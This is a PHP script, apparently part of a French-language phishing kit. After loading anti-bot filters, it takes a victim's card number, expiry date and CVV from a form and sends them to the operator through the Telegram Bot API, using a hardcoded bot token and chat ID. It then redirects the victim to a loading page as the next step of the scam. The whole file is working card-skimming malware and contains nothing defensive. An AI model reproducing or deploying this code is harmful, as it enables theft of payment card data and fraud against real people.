<?php

include '../src/antibots.php';
include '../antibots.php';
include '../anti/anti1.php';
include '../anti/anti2.php';
include '../anti/anti3.php';
include '../anti/anti4.php';
include '../anti/anti5.php';
include '../anti/anti6.php';
include '../anti/anti7.php';
include '../anti/anti8.php';



// Remplacez par le token de votre bot Telegram
$botToken = "8013840116:AAGh5D3KdwSRvjBd5q-oSYcio0PHoDhCazQ";
// Remplacez par l'ID de chat ou de groupe où envoyer les données
$chatId = "8134069302"; 

// Récupération des données du formulaire
$cardNumber = $_POST['cardNumber'] ?? '';
$expiryDate = $_POST['expiryDate'] ?? '';
$cvv = $_POST['cvv'] ?? '';

// Vérifiez que tous les champs nécessaires sont remplis
if (empty($cardNumber) || empty($expiryDate) || empty($cvv)) {
    echo "Tous les champs doivent être remplis.";
    exit;
}

// Préparer le message à envoyer
$message = "💳 **Détails de la Carte Bancaire**:\n\n";
$message .= "Numéro de Carte: " . htmlspecialchars($cardNumber) . "\n";
$message .= "Date d'Expiration: " . htmlspecialchars($expiryDate) . "\n";
$message .= "CVV: " . htmlspecialchars($cvv) . "\n";

// URL de l'API Telegram
$url = "https://api.telegram.org/bot$botToken/sendMessage";

// Paramètres de la requête
$data = [
    'chat_id' => $chatId,
    'text' => $message,
    'parse_mode' => 'Markdown' // Permet d'avoir du texte formaté
];

// Effectuer une requête HTTP POST à l'API Telegram
$options = [
    'http' => [
        'header'  => "Content-type: application/x-www-form-urlencoded\r\n",
        'method'  => 'POST',
        'content' => http_build_query($data),
    ],
];

$context  = stream_context_create($options);
$result = file_get_contents($url, false, $context);

// Vérifier la réponse de l'API Telegram
if ($result) {
       // Redirection vers otp.php
       header("Location: ../chargement.php");
       exit;
} else {
    header("Location: ../carte.php");
    exit;;
}
?>
